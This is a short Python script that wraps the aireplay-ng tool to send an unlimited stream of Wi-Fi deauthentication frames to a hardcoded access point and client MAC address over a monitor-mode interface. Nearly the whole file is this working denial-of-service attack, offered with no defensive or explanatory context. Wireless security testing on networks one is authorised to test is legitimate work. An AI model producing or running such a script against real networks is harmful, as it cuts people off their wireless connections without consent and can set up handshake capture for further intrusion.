import subprocess

def identify_clients():
    ap_mac = "00:11:22:33:44:55"
    c_mac = "66:77:88:99:AA:BB"
    return ap_mac, c_mac

def deauth(ap_mac, c_mac):
    try:
        command = ["aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, "wlan0mon"]
        subprocess.run(command, check=True)
    except KeyboardInterrupt:
        print("\nDeauthentication interrupted")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing aireplay-ng: {e}")

if __name__ == "__main__":
    ap_mac, c_mac = identify_clients()
    deauth(ap_mac, c_mac)
